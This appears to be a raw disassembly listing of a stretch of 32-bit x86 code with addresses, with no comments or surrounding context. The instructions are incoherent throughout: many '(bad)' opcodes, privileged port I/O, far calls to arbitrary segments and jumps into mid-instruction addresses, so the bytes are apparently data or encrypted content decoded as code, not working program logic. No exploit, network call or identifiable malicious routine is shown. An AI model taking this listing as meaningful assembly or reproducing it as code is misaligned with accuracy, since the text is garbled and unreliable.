  413742:	repnz mov dh,0xd9
  413745:	sub    BYTE PTR [edx+edi*1+0x2777952d],ch
  41374c:	sbb    al,0x85
  41374e:	add    ebp,DWORD PTR [ebp+0xdbd8058]
  413754:	(bad)  
  413755:	pop    ebx
  413756:	gs jle 0x41375b
  413759:	pop    es
  41375a:	inc    esi
  41375b:	je     0x4137c1
  41375d:	ins    BYTE PTR es:[edi],dx
  41375e:	lahf   
  41375f:	xchg   BYTE PTR [edi-0x67ceaa07],al
  413765:	push   0x45
  413767:	push   ebp
  413768:	int    0x66
  41376a:	jb     0x4137db
  41376c:	adc    al,0xb1
  41376e:	push   ecx
  41376f:	xchg   DWORD PTR [edi-0x3d975e72],esi
  413775:	psrlw  mm6,mm7
  413778:	repz (bad) 
  41377b:	mov    cx,0xdb58
  41377f:	clc    
  413780:	das    
  413781:	(bad)  
  413782:	div    esi
  413784:	hlt    
  413785:	add    eax,0xbb94195a
  41378a:	test   edx,0x33dad995
  413790:	pop    ds
  413791:	mov    al,0x53
  413793:	out    dx,eax
  413794:	stc    
  413795:	sub    DWORD PTR [edx+0x7],edx
  413798:	scas   eax,DWORD PTR es:[edi]
  413799:	xchg   edi,eax
  41379a:	xchg   ecx,eax
  41379b:	ins    DWORD PTR es:[edi],dx
  41379c:	enter  0x702,0x21
  4137a0:	dec    edx
  4137a1:	inc    ecx
  4137a2:	mov    eax,0x39520041
  4137a7:	mov    al,ds:0x6371bad4
  4137ac:	icebp  
  4137ad:	not    ebp
  4137af:	adc    BYTE PTR [edi],bh
  4137b1:	adc    al,0xeb
  4137b3:	and    DWORD PTR [ecx],0xffffff91
  4137b6:	or     BYTE PTR [ebp+0x3972ab91],dh
  4137bc:	jg     0x413750
  4137be:	aam    0xee
  4137c0:	imul   BYTE PTR [edx+ebx*2+0x3a]
  4137c4:	and    eax,0x52464b0c
  4137c9:	fistp  WORD PTR [ebx+edx*4]
  4137cc:	test   BYTE PTR [ebx+0x7069b181],cl
  4137d2:	jecxz  0x413853
  4137d4:	mov    ah,0xd5
  4137d6:	ins    BYTE PTR es:[edi],dx
  4137d7:	ret    
  4137d8:	icebp  
  4137d9:	ins    BYTE PTR es:[edi],dx
  4137da:	sub    eax,0x91303e60
  4137df:	outs   dx,DWORD PTR ds:[esi]
  4137e0:	call   0x9bf8:0x4632585b
  4137e7:	es ror eax,cl
  4137ea:	adc    bl,BYTE PTR [esi]
  4137ec:	add    DWORD PTR [ebp+0x47b7e3bc],edi
  4137f2:	call   0xb21bcc10
  4137f7:	fisub  DWORD PTR [edx]
  4137f9:	adc    eax,0x4353cdd1
  4137fe:	repnz xor DWORD PTR [esi+edi*4-0x34813faa],eax
  413806:	jb     0x413852
  413808:	frstor [ebx+0x6347facd]
  41380e:	push   esi
  41380f:	(bad)  
  413811:	or     esp,DWORD PTR [eax+0x4ac1c1fd]
  413817:	mov    dl,0xe3
  413819:	mov    ecx,0xfb8a7217
  41381e:	shl    DWORD PTR [esi+0x2e],1
  413821:	enter  0xe332,0x28
  413825:	(bad)  
  413826:	cmp    eax,0xd25636cd
  41382b:	xchg   edx,eax
  41382c:	mov    ds:0xc8539514,eax
  413831:	out    dx,eax
  413832:	push   ebp
  413833:	xlat   BYTE PTR ds:[ebx]
  413834:	(bad)  
  413835:	jmp    0x4137ef
  413837:	fdivr  DWORD PTR [eax+esi*4-0x1b]
  41383b:	outs   dx,BYTE PTR ds:[esi]
  41383c:	retf   
  41383d:	imul   esi,edi,0x6545dfe3
  413843:	or     al,0x8a
  413845:	(bad)  
  413846:	jno    0x41386b
  413848:	fs pop edx
  41384a:	mov    bh,0x88
  41384c:	outs   dx,BYTE PTR ds:[esi]
  41384d:	call   0x690f:0xeb10f7f3
  413854:	mov    BYTE PTR ds:0xf4efd571,0x31
  41385b:	adc    al,0x17
  41385d:	or     BYTE PTR [ebx-0x7e],dl
  413860:	fcom   DWORD PTR [eax]
  413862:	bnd jnp 0x4138b7
  413865:	into   
  413866:	xor    al,0x62
  413868:	mov    edx,0xebaa8ce3
  41386d:	clc    
  41386e:	or     DWORD PTR [esi+0x12cdb391],0x833a79a9
  413878:	retf   0xd61
  41387b:	dec    edx
  41387c:	pop    ecx
  41387d:	dec    esi
  41387e:	pop    ecx
  41387f:	cli    
  413880:	call   DWORD PTR [edx-0x85a5b2b]
  413886:	dec    esp
  413887:	bound  eax,QWORD PTR [edx+0x4199dfcd]
  41388d:	inc    esp
  41388e:	out    0xb3,al
  413890:	push   cs
  413891:	stc    
  413892:	mov    dl,0x0
  413894:	test   eax,0x38f33fe4
  413899:	fwait
  41389a:	out    0x7e,al
  41389c:	not    ch
  41389e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41389f:	bound  ecx,QWORD PTR [edi-0x4926e184]
  4138a5:	xchg   ebx,eax
  4138a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4138a7:	inc    ebp
  4138a8:	mov    ah,0x6
  4138aa:	into   
  4138ab:	mov    dh,0xd2
  4138ad:	push   ss
  4138ae:	sub    cl,BYTE PTR [edi+ebp*4-0x4b]
  4138b2:	adc    bl,BYTE PTR [edx-0x31]
  4138b5:	xchg   esp,eax
  4138b6:	pop    ebp
  4138b7:	daa    
  4138b8:	retf   
  4138b9:	repz sbb eax,0xf16b6619
  4138bf:	jl     0x41393a
  4138c1:	(bad)  
  4138c3:	lock cld 
  4138c5:	xlat   BYTE PTR ds:[ebx]
  4138c6:	neg    BYTE PTR [ecx+0x77]
  4138c9:	add    bh,ch
  4138cb:	adc    eax,ebx
  4138cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4138ce:	add    ecx,DWORD PTR [edx+0x23]
  4138d1:	xchg   DWORD PTR [esi+0x64],esp
  4138d4:	fsubr  st,st(6)
  4138d6:	jo     0x413953
  4138d8:	cmp    al,0xb8
  4138da:	mov    ds:0x617d169a,al
  4138df:	nop
  4138e0:	add    DWORD PTR [ebp-0x64c9e371],ecx
  4138e6:	pop    esp
  4138e7:	xchg   esi,eax
  4138e8:	or     ebp,DWORD PTR [edi+0x1ac40bd6]
  4138ee:	iret   
  4138ef:	aas    
  4138f0:	dec    dl
  4138f2:	mov    esp,0x539e8617
  4138f7:	(bad)  
  4138f8:	cmp    eax,0x699c5208
  4138fd:	sub    al,0xd8
  4138ff:	leave  
  413900:	(bad)  [edi-0x6e]
  413903:	pop    esi
  413904:	mov    eax,0xbd10731f
  413909:	push   0xe
  41390b:	fwait
  41390c:	aad    0x21
  41390e:	mov    esi,0xe6f05518
  413913:	pushf  
  413914:	jmp    0x33e0bbac
  413919:	pop    esi
  41391a:	pop    eax
  41391b:	sub    al,0x39
  41391d:	stc    
  41391e:	ss scas al,BYTE PTR es:[edi]
  413920:	add    BYTE PTR [ecx],al
  413922:	dec    esp
  413923:	cmp    ecx,edx
  413925:	push   0x815f7cc6
  41392a:	adc    ebp,DWORD PTR [edx+0x32]
  41392d:	jno    0x413960
  41392f:	jecxz  0x4138e7
  413931:	jl     0x413930
  413933:	mov    dh,0xba
  413935:	xor    DWORD PTR [ebp-0x53],edi
  413938:	and    DWORD PTR [edi+edi*4],ecx
  41393b:	loope  0x41398b
  41393d:	test   BYTE PTR [ebp+0x3de93c42],ch
  413943:	sahf   
  413944:	mov    cl,0x2f
  413946:	jmp    DWORD PTR [ecx+ecx*1+0x7e]
  41394a:	ds jmp 0x413954
  41394d:	push   es
  41394e:	mov    ebx,0xcefd1930
  413953:	fisttp DWORD PTR ds:0x56af571f
  413959:	popf   
  41395a:	data16 mov BYTE PTR [edx+eiz*4+0x73],cl
  41395f:	xor    eax,0x109fcf0e
  413964:	fst    QWORD PTR [edx+0x6f]
  413967:	test   esp,0x487c9de5
  41396d:	fisubr DWORD PTR [edi+0x52]
  413970:	les    ecx,FWORD PTR [eax+edx*2-0x5a]
  413974:	fwait
  413975:	push   ebp
  413976:	sbb    eax,0x600b3dbb
  41397b:	mov    eax,0xbf0de3fe
  413980:	inc    esp
  413981:	adc    eax,0x2902fe3f
  413986:	or     ecx,esp
  413988:	call   FWORD PTR [edi+0x5]
  41398b:	call   0xd72c:0xdd2cbe4d
  413992:	lahf   
  413993:	lods   eax,DWORD PTR ds:[esi]
  413994:	cmp    eax,0xe3aa15a6
  413999:	jmp    0x4139ad
  41399b:	stc    
  41399c:	push   esi
  41399d:	and    eax,0xe7457dd2
  4139a2:	out    dx,eax
  4139a3:	mov    ss,WORD PTR [ebx+0x4a31ccad]
  4139a9:	push   ebx
  4139aa:	add    eax,0x3000085e
  4139af:	sub    cl,dh
  4139b1:	popf   
  4139b2:	mov    edx,0x4e9a8b93
  4139b7:	ficom  WORD PTR [ebx+eax*8]
  4139ba:	adc    eax,0xd4828dc4
  4139bf:	ret    0x3120
  4139c2:	jge    0x41399d
  4139c4:	in     al,0xcf
  4139c6:	and    al,0x70
  4139c8:	sbb    esi,DWORD PTR [ebp-0x3d4cc70b]
  4139ce:	dec    eax
  4139cf:	ret    
  4139d0:	mov    ch,0x36
  4139d2:	inc    ebx
  4139d3:	fsub   QWORD PTR [eax+0x39ce383c]
  4139d9:	sub    eax,0x2197e3d6
  4139de:	loope  0x413998
  4139e0:	inc    edx
  4139e1:	lock fsub DWORD PTR [esi+0x3d62374b]
  4139e8:	aaa    
  4139e9:	inc    esp
  4139ea:	xor    DWORD PTR [ebx+0x6e],esi
  4139ed:	add    ecx,edx
  4139ef:	ud1    eax,DWORD PTR [ebx-0x3f]
  4139f3:	(bad)  
  4139f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4139f5:	xchg   ebp,eax
  4139f6:	and    eax,0xdc8ed8fa
  4139fb:	add    al,0xd7
  4139fd:	push   esi
  4139fe:	rol    ebx,1
  413a00:	test   eax,0x4fcc6a6b
  413a05:	inc    ebx
  413a06:	retf   0xb5fb
  413a09:	into   
  413a0a:	add    ebp,DWORD PTR [eax]
  413a0c:	std    
  413a0d:	sbb    dh,BYTE PTR [edi+0x6b7942e7]
  413a13:	leave  
  413a14:	push   edi
  413a15:	out    dx,al
  413a16:	dec    edi
  413a17:	call   0x3dbc:0x167287e4
  413a1e:	(bad)  
  413a1f:	(bad)  
  413a20:	mul    bl
  413a22:	sub    BYTE PTR [esp+edi*2+0x2b51e884],ch
  413a29:	into   
  413a2a:	and    edi,DWORD PTR [esi-0xe]
  413a2d:	adc    ebp,DWORD PTR [ecx]
  413a2f:	sbb    eax,ebx
  413a31:	cmp    eax,0x407b77ba
  413a36:	mov    eax,ds:0xba81ebda
  413a3b:	loop   0x4139bf
  413a3d:	mov    ebp,0x14a82dc7
  413a42:	adc    esp,DWORD PTR [ebx+ecx*4-0x5f]
  413a46:	mov    edi,0x2e3b54b8
  413a4b:	push   es
  413a4c:	frstpm(287 only) 
  413a4e:	dec    edx
  413a4f:	xchg   dx,ax
  413a51:	xchg   DWORD PTR [eax+0x19b49752],eax
  413a57:	adc    DWORD PTR [ebp-0x4c],0x11
  413a5b:	fmulp  st(3),st
  413a5d:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413a5f:	inc    edi
  413a60:	jo     0x413a2c
  413a62:	dec    esp
  413a63:	push   ebx
  413a64:	call   0xcec26e0d
  413a69:	mov    eax,0xb36210d7
  413a6e:	or     al,BYTE PTR [eax-0x3c]
  413a71:	fisubr DWORD PTR [esi]
  413a73:	mov    cl,0x3e
  413a75:	or     ebp,DWORD PTR [esi+0x4a3b6d03]
  413a7b:	push   ecx
  413a7c:	ss pop edi
  413a7e:	adc    BYTE PTR [esi+0x4ae0f005],cl
  413a84:	cli    
  413a85:	iret   
  413a86:	mov    WORD PTR [ebx+0x30],ss
  413a89:	stc    
  413a8a:	lds    edi,FWORD PTR ds:0x636149f
  413a90:	shr    esp,cl
  413a92:	mov    ebp,0xb6f04a56
  413a97:	push   esp
  413a98:	mov    dl,0x2
  413a9a:	push   ebp
  413a9b:	prefetch BYTE PTR [ecx+eax*8+0x3c8c7217]
  413aa3:	retf   
  413aa4:	push   es
  413aa5:	mov    eax,ds:0xc8957186
  413aaa:	pop    eax
  413aab:	lock sahf 
  413aad:	mov    al,BYTE PTR [eax+0x17]
  413ab0:	pop    edi
  413ab1:	pop    edi
  413ab2:	es xchg ecx,eax
  413ab4:	or     al,0xc2
  413ab6:	mov    ds:0x13e86ca4,eax
  413abb:	inc    edi
  413abc:	out    dx,al
  413abd:	call   0x2f93:0xbe3c1741
  413ac4:	popa   
  413ac5:	sbb    BYTE PTR [edi],dh
  413ac7:	fs mov si,0xb99
  413acc:	xor    eax,0xe5ffb3b1
  413ad1:	and    DWORD PTR [ecx-0x2efde959],ebp
  413ad7:	retf   
  413ad8:	jae    0x413b1d
  413ada:	test   bl,bl
  413adc:	sbb    eax,0xfe0b2ca6
  413ae1:	hlt    
  413ae2:	or     ebx,DWORD PTR [esi]
  413ae4:	inc    esi
  413ae5:	jo     0x413aba
  413ae7:	hlt    
  413ae8:	popf   
  413ae9:	pusha  
  413aea:	mov    BYTE PTR [esi+0x47],al
  413aed:	jb     0x413ab1
  413aef:	inc    eax
  413af0:	cmc    
  413af1:	lock (bad) ds:0xe7cef766
  413af8:	adc    BYTE PTR [edx+ebp*4-0x43bfdb8f],cl
  413aff:	into   
  413b00:	test   BYTE PTR [ebp-0xc5df6d6],cl
  413b06:	push   ebp
  413b07:	cmp    DWORD PTR [eax+0x78],0x49e814dc
  413b0e:	push   ecx
  413b0f:	jns    0x413b54
  413b11:	ss inc esp
  413b13:	dec    esi
  413b14:	clc    
  413b15:	fld    TBYTE PTR [edx+0x51]
  413b18:	sahf   
  413b19:	jne    0x413a9d
  413b1b:	xor    ecx,DWORD PTR [ecx-0x4a]
  413b1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413b1f:	xor    eax,0x6cc2b369
  413b24:	cdq    
  413b25:	sub    edx,0x414d42f1
  413b2b:	mov    gs,WORD PTR [ecx]
  413b2d:	stos   BYTE PTR es:[edi],al
  413b2e:	loopne 0x413afa
  413b30:	daa    
  413b31:	push   0x2bb6dcf9
  413b36:	jl     0x413b54
  413b38:	jae    0x413ad6
  413b3a:	and    al,ch
  413b3c:	pop    es
  413b3d:	jns    0x413ba1
  413b3f:	add    BYTE PTR [esi],dl
  413b41:	out    dx,eax
  413b42:	bound  ebp,QWORD PTR [edx+0x707f43bd]
  413b48:	jge    0x413adb
  413b4a:	sub    al,0x1c
  413b4c:	jno    0x413b1f
  413b4e:	push   ecx
  413b4f:	mov    esi,0x864e5cfa
  413b54:	jne    0x413bba
  413b56:	inc    esp
  413b57:	mov    ebx,0xfbf200b7
  413b5c:	adc    al,0xca
  413b5e:	cmc    
  413b5f:	sbb    eax,0xf111b573
  413b64:	jne    0x413b87
  413b66:	sub    eax,0xd1003b6b
  413b6b:	mul    DWORD PTR ds:0x16695631
  413b71:	rcl    BYTE PTR [eax],1
  413b73:	leave  
  413b74:	dec    edi
  413b75:	ret    0x14ae
  413b78:	inc    esp
  413b79:	mov    dl,0xc6
  413b7b:	(bad)  
  413b7c:	rcr    ch,cl
  413b7e:	jbe    0x413b27
  413b80:	mov    eax,ds:0xb4642ec9
  413b85:	mov    cl,al
  413b87:	dec    esi
  413b88:	cs add al,0xad
  413b8b:	fld    DWORD PTR [ebx]
  413b8d:	out    dx,eax
  413b8e:	and    DWORD PTR [ebp-0x57fe5edc],esp
  413b94:	cmc    
  413b95:	fild   DWORD PTR [ebx+0x60df4642]
  413b9b:	or     ch,BYTE PTR [ebp-0x18]
  413b9e:	dec    edx
  413b9f:	sbb    eax,0x225296ce
  413ba4:	(bad)
  413ba8:	mov    ch,BYTE PTR [ecx]
  413baa:	xor    dh,ch
  413bac:	mov    ds:0x44f8c4dd,eax
  413bb1:	cmc    
  413bb2:	icebp  
  413bb3:	jge    0x413c2d
  413bb5:	add    esi,DWORD PTR [eax+0x73]
  413bb8:	cmove  ebx,DWORD PTR [ebp-0xcf898dc]
  413bbf:	es xchg ebx,eax
  413bc1:	out    0x6c,al
  413bc3:	in     eax,0x4d
  413bc5:	mov    ebp,0x56ebf36d
  413bca:	mov    ecx,0x66166930
  413bcf:	sahf   
  413bd0:	jnp    0x413bd9
  413bd2:	ds or  edi,edx
  413bd5:	jns    0x413bdd
  413bd7:	ins    BYTE PTR es:[edi],dx
  413bd8:	push   eax
  413bd9:	js     0x413c08
  413bdb:	in     al,dx
  413bdc:	sbb    ecx,DWORD PTR [esi+0x7ce23011]
  413be2:	push   es
  413be3:	adc    BYTE PTR gs:[eax+0x33],ah
  413be7:	jns    0x413bdb
  413be9:	stc    
  413bea:	and    eax,0xe975820c
  413bef:	stc    
  413bf0:	aad    0xb7
  413bf2:	sbb    DWORD PTR [ecx+edi*2+0x430a359e],0xe4a9c976
  413bfd:	mov    DWORD PTR [ebx-0x55],eax
  413c00:	sub    bh,BYTE PTR [ebx-0x6e]
  413c03:	xor    eax,eax
  413c05:	inc    esp
  413c06:	mov    edi,0xa127c279
  413c0b:	imul   BYTE PTR [esp+ebx*2+0xb]
  413c0f:	add    eax,0x9c5505ba
  413c14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413c15:	cwde   
  413c16:	outs   dx,BYTE PTR ds:[esi]
  413c17:	mov    ebx,0x11ecd952
  413c1c:	pop    ds
  413c1d:	lock jp 0x413bad
  413c20:	loope  0x413c1b
  413c22:	repz jmp 0x413bb7
  413c25:	les    eax,FWORD PTR [eax]
  413c27:	add    cl,0xbe
  413c2a:	xlat   BYTE PTR ds:[ebx]
  413c2b:	outs   dx,DWORD PTR ds:[esi]
  413c2c:	xchg   edi,eax
  413c2d:	lds    esp,FWORD PTR [eax-0xd]
  413c30:	fdiv   DWORD PTR [ecx+0x26b3fee9]
  413c36:	fsub   QWORD PTR [esi-0xc]
  413c39:	les    esi,FWORD PTR [eax]
  413c3b:	cmp    BYTE PTR [ecx-0x6ba0ca44],al
  413c41:	cmp    BYTE PTR [esi],dl
  413c43:	sar    DWORD PTR [edx],0xc1
  413c46:	pop    bx
  413c48:	jecxz  0x413c7c
  413c4a:	jbe    0x413be4
  413c4c:	cdq    
  413c4d:	addr16 (bad) 
  413c4f:	popaw  
  413c51:	sbb    eax,0x271e3c4b
  413c56:	pusha  
  413c57:	jecxz  0x413c2e
  413c59:	je     0x413ca1
  413c5b:	mov    gs,WORD PTR [eax]
  413c5d:	pop    ss
  413c5e:	retf   
  413c5f:	push   ecx
  413c60:	out    0x53,al
  413c62:	xchg   esi,eax
  413c63:	inc    esi
  413c64:	int    0x4d
  413c66:	call   0x33103d57
  413c6b:	out    dx,eax
  413c6c:	pop    edx
  413c6d:	sar    esi,cl
  413c6f:	mov    esi,0x9ecc5bb2
  413c74:	mov    al,ds:0xd9616f7
  413c79:	or     BYTE PTR [ebx-0x4a6db007],ch
  413c7f:	mov    ds:0x5c1e56dd,eax
  413c84:	loope  0x413c12
  413c86:	xlat   BYTE PTR ds:[ebx]
  413c87:	jnp    0x413c9b
  413c89:	cwde   
  413c8a:	xchg   ebx,eax
  413c8b:	mov    ds:0x11314dd6,al
  413c90:	sbb    al,0x91
  413c92:	or     eax,edi
  413c94:	mov    eax,ds:0xd5b77353
  413c99:	pop    esi
  413c9a:	push   ss
  413c9b:	and    edx,esi
  413c9d:	xchg   edx,eax
  413c9e:	jl     0x413c92
  413ca0:	lahf   
  413ca1:	(bad)  
  413ca2:	js     0x413cc1
  413ca4:	mov    dh,0x94
  413ca6:	inc    ecx
  413ca7:	std    
  413ca8:	add    BYTE PTR ds:0x88572712,0xba
  413caf:	(bad)  
  413cb1:	out    0x49,eax
  413cb3:	retf   
  413cb4:	into   
  413cb5:	inc    ebx
  413cb6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413cb7:	jmp    0x413ced
  413cb9:	mov    edi,0x3e624246
  413cbe:	sbb    edi,DWORD PTR [esi-0x6a]
  413cc1:	jecxz  0x413cdc
  413cc3:	jb     0x413ca9
  413cc5:	push   ebp
  413cc6:	jnp    0x413d21
  413cc8:	push   ebp
  413cc9:	push   0xffffffdb
  413ccb:	inc    edx
  413ccc:	mov    edi,0xd6c33538
  413cd1:	mov    ecx,0xa9172a3b
  413cd6:	daa    
  413cd7:	out    0xd4,eax
  413cd9:	out    0x64,al
  413cdb:	fxch   st(1)
  413cdd:	jmp    0x99a7:0x5b03a231
  413ce4:	xchg   BYTE PTR [ecx+0x78],dl
  413ce7:	xor    eax,0x750105a5
  413cec:	jmp    0x4814:0xc4aa8cd9
  413cf3:	jmp    0x58f4fdca
  413cf8:	mov    BYTE PTR [esi-0x36],dl
  413cfb:	mov    dl,0xb8
  413cfd:	add    eax,0xad469adf
  413d02:	ret    0xd2b8
  413d05:	lahf   
  413d06:	jns    0x413d5d
  413d08:	or     al,0xc8
  413d0a:	ficomp DWORD PTR [ecx]
  413d0c:	nop
  413d0d:	mov    eax,ds:0x8994db75
  413d12:	mov    esp,0xbeeb82d7
  413d17:	sub    ah,cl
  413d19:	scas   eax,DWORD PTR es:[edi]
  413d1a:	inc    esi
  413d1b:	xor    al,0xd1
  413d1d:	lahf   
  413d1e:	adc    DWORD PTR [ebx],ebx
  413d20:	imul   edi,DWORD PTR [ebx+0x6090b1b9],0xffffffad
  413d27:	xor    eax,0xae6ebc7d
  413d2c:	es jo  0x413d55
  413d2f:	mov    edi,eax
  413d31:	push   eax
  413d32:	cld    
  413d33:	out    dx,eax
  413d34:	outs   dx,BYTE PTR ds:[esi]
  413d35:	jg     0x413d13
  413d37:	pop    ds
  413d38:	(bad)
  413d3b:	ror    dh,cl
  413d3d:	mov    dl,0x92
  413d3f:	pop    esi
  413d40:	les    edx,FWORD PTR [edi]
  413d42:	sbb    DWORD PTR [ecx+0x68],0x6fe33a9
  413d49:	jnp    0x413d21
  413d4b:	xchg   edi,eax
  413d4c:	call   0x2a89:0x49de9e9a
  413d53:	dec    ebx
  413d54:	xchg   ebp,eax
  413d55:	jno    0x413cfd
  413d57:	ds push ebx
  413d59:	imul   esp,DWORD PTR [edx-0x29],0x2f
  413d5d:	test   eax,0x63d81260
  413d62:	out    0xd1,eax
  413d64:	pop    eax
  413d65:	mov    ah,0xb
  413d67:	fcom   QWORD PTR [esi]
  413d69:	je     0x413d70
  413d6b:	jae    0x413d36
  413d6d:	push   ecx
  413d6e:	sbb    dl,cl
  413d70:	sub    DWORD PTR [edi],esi
  413d72:	inc    esi
  413d73:	cwde   
  413d74:	enter  0x8a46,0x6f
  413d78:	ja     0x413da6
  413d7a:	push   edx
  413d7b:	add    esp,DWORD PTR [eax]
  413d7d:	pop    esi
  413d7e:	push   edi
  413d7f:	xchg   esp,eax
  413d80:	sahf   
  413d81:	loopne 0x413d6f
  413d83:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413d84:	cdq    
  413d85:	inc    ecx
  413d86:	sbb    ah,cl
  413d88:	push   edx
  413d89:	retf   
  413d8a:	xchg   esi,eax
  413d8b:	jno    0x413dbf
  413d8d:	cmp    eax,0xc93a6619
  413d92:	js     0x413d82
  413d94:	es stc 
  413d96:	pop    esi
  413d97:	sub    dl,BYTE PTR [ecx-0x34]
  413d9a:	cs loop 0x413d20
  413d9d:	adc    ecx,DWORD PTR [ebx-0x5d]
  413da0:	sbb    BYTE PTR [edi-0x45],ch
  413da3:	mov    ebx,0xde425b45
  413da8:	pop    es
  413da9:	test   al,0xe9
  413dab:	xor    esi,ebx
  413dad:	add    BYTE PTR [esi-0xe1e0adb],0xdf
  413db4:	je     0x413e01
  413db6:	in     eax,0x23
  413db8:	lock sbb al,0x69
  413dbb:	fnsave [ebx+0x5]
  413dbe:	push   eax
  413dbf:	add    al,0xc4
  413dc1:	cs loope 0x413dff
  413dc4:	dec    ebp
  413dc5:	bound  esp,QWORD PTR [ebp+0x73b1953]
  413dcb:	push   ecx
  413dcc:	cmp    al,0x34
  413dce:	xor    cl,BYTE PTR [edi]
  413dd0:	ins    BYTE PTR es:[edi],dx
  413dd1:	mov    WORD PTR [esi-0x727f2929],cs
  413dd7:	leave  
  413dd8:	int    0x34
  413dda:	mov    es,WORD PTR [esi]
  413ddc:	mov    ebp,0x674baf8d
  413de1:	or     DWORD PTR [ebx+0x38],0x624f72e6
  413de8:	push   edi
  413de9:	loopne 0x413e2a
  413deb:	pop    esp
  413dec:	mov    bl,0xb1
  413dee:	jl     0x413dda
  413df0:	inc    ebp
  413df1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413df2:	cmp    esp,DWORD PTR [edi+0x5990dcd]
  413df8:	pushf  
  413df9:	add    eax,0xe550ae05
  413dfe:	inc    edx
  413dff:	push   0xa31a9c8b
  413e04:	sbb    BYTE PTR fs:[ecx-0x7e],bh
  413e08:	push   edx
  413e09:	push   ss
  413e0a:	mov    al,0xd0
  413e0c:	sar    BYTE PTR [eax-0x306b41f4],1
  413e12:	or     al,0xdb
  413e14:	push   ds
  413e15:	jl     0x413dff
  413e17:	(bad)  
  413e18:	jbe    0x413e33
  413e1a:	sbb    al,0x85
  413e1c:	sti    
  413e1d:	popa   
  413e1e:	std    
  413e1f:	pop    ds
  413e20:	fist   DWORD PTR [ebx-0x4e]
  413e23:	(bad)  
  413e25:	jns    0x413dd0
  413e27:	fsub   st,st(3)
  413e29:	sub    al,0x7d
  413e2b:	add    esi,DWORD PTR [edi+0x7]
  413e2e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413e2f:	adc    BYTE PTR [ebx],al
  413e31:	pop    esp
  413e32:	and    eax,0xd1f5d779
  413e37:	xchg   esi,eax
  413e38:	ins    BYTE PTR es:[edi],dx
  413e39:	dec    edi
  413e3a:	pop    ss
  413e3b:	push   ebx
  413e3c:	test   al,0x50
  413e3e:	lods   eax,DWORD PTR ds:[esi]
  413e3f:	mov    WORD PTR [ecx+0xe],gs
  413e42:	xchg   esi,eax
  413e43:	cwde   
  413e44:	(bad)  
  413e45:	push   edi
  413e46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413e47:	or     al,0x89
  413e49:	jmp    0x8665:0xc0235d96
  413e50:	out    0x84,al
  413e52:	adc    eax,0x15de06c9
  413e57:	clc    
  413e58:	(bad)  
  413e59:	cdq    
  413e5a:	repz dec ebx
  413e5c:	mov    bh,0xd8
  413e5e:	mov    al,0x9b
  413e60:	(bad)  
  413e61:	jnp    0x413e61
  413e63:	frstor [edi]
  413e65:	adc    eax,0x9d095f3c
  413e6a:	(bad)  
  413e6b:	push   edx
  413e6c:	push   eax
  413e6d:	nop
  413e6e:	in     eax,dx
  413e6f:	push   esp
  413e70:	hlt    
  413e71:	add    al,0x50
  413e73:	mov    al,ds:0xb458a2c1
  413e78:	adc    DWORD PTR [ebx-0x56],ebx
  413e7b:	enter  0x8535,0xb0
  413e7f:	fisubr DWORD PTR [ebx-0x157e618e]
  413e85:	test   dl,bl
  413e87:	inc    edx
  413e88:	push   0xffffff8e
  413e8a:	loope  0x413e88
  413e8c:	xchg   edi,eax
  413e8d:	sub    edi,esi
  413e8f:	cmp    ebp,edi
  413e91:	xchg   esp,eax
  413e93:	outs   dx,DWORD PTR ds:[esi]
  413e94:	shl    BYTE PTR [edi+0x510c9246],cl
  413e9a:	or     DWORD PTR [esi-0x66a37473],edi
  413ea0:	fldenv [edx]
  413ea2:	add    eax,0x1b94342d
  413ea7:	hlt    
  413ea8:	mov    dl,0x4d
  413eaa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413eab:	je     0x413ea3
  413ead:	lahf   
  413eae:	cmp    edi,esp
  413eb0:	push   esp
  413eb1:	pop    ds
  413eb2:	xchg   DWORD PTR [eax-0x40a97fb],edi
  413eb8:	call   0x16dd:0x7dde75f1
  413ebf:	add    DWORD PTR [ebx],ebp
  413ec1:	push   esi
  413ec2:	jo     0x413f1b
  413ec4:	mov    ?,WORD PTR [ecx+0x3315b380]
  413eca:	es cmp ch,ah
  413ecd:	xor    eax,DWORD PTR [ebx+0x277196bb]
  413ed3:	imul   edi
  413ed5:	cs dec eax
  413ed7:	lods   eax,DWORD PTR ds:[esi]
  413ed8:	test   al,0xd6
  413eda:	and    dl,dh
  413edc:	es xchg ebp,eax
  413ede:	and    dh,BYTE PTR [esi+0x32]
  413ee1:	loop   0x413ecc
  413ee3:	adc    DWORD PTR [ebp+0x47b0a7b7],esi
  413ee9:	arpl   WORD PTR [edi],bp
  413eeb:	mov    ah,0xa7
  413eed:	cmp    bl,BYTE PTR [edi]
  413eef:	xchg   edx,eax
  413ef0:	addr16 jae 0x413ea1
  413ef3:	icebp  
  413ef4:	mov    dh,0xcc
  413ef6:	aad    0xb9
  413ef8:	ins    BYTE PTR es:[edi],dx
  413ef9:	and    BYTE PTR [ebx],cl
  413efb:	adc    ecx,eax
  413efd:	popa   
  413efe:	jo     0x413f77
  413f00:	sub    DWORD PTR [eax-0x48],0xffffffc5
  413f04:	out    dx,al
  413f05:	scas   al,BYTE PTR es:[edi]
  413f06:	mov    BYTE PTR [ebx],ah
  413f08:	adc    eax,0x13a46e2f
  413f0d:	sub    al,0x4b
  413f0f:	add    eax,0x5b57d340
  413f14:	push   edx
  413f15:	mov    eax,0x993df7f1
  413f1a:	lds    esp,FWORD PTR [edx]
  413f1c:	and    al,0x46
  413f1e:	pop    ss
  413f1f:	out    dx,eax
  413f20:	(bad)  
  413f21:	push   ecx
  413f22:	test   al,0x2e
  413f24:	xor    BYTE PTR [ebp+0x54],bl
  413f27:	mov    ds:0xab8ce43e,eax
  413f2c:	fwait
  413f2d:	mov    ah,0xd1
  413f2f:	xor    eax,0xd478e519
  413f34:	fptan  
  413f36:	mov    edx,0xd031b08e
  413f3b:	bound  ebp,QWORD PTR [esi+0x70]
  413f3e:	mov    esi,0xfb2ac554
